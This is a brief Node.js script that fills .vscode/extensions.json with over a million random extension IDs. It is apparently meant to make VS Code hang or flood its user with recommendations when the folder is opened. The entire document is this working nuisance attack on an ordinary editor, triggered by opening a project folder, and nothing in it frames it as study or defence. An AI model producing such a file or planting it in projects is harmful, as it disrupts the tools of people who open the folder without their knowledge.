const fs = require("fs")

function makeid(length) {
    let result = ""
    let characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    let charactersLength = characters.length
    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength))
    return result;
}

const content = {recommendations: []}
for (let i = 0; i <= 1000000; i++) content.recommendations.push(makeid(10))

fs.writeFileSync("./.vscode/extensions.json", JSON.stringify(content))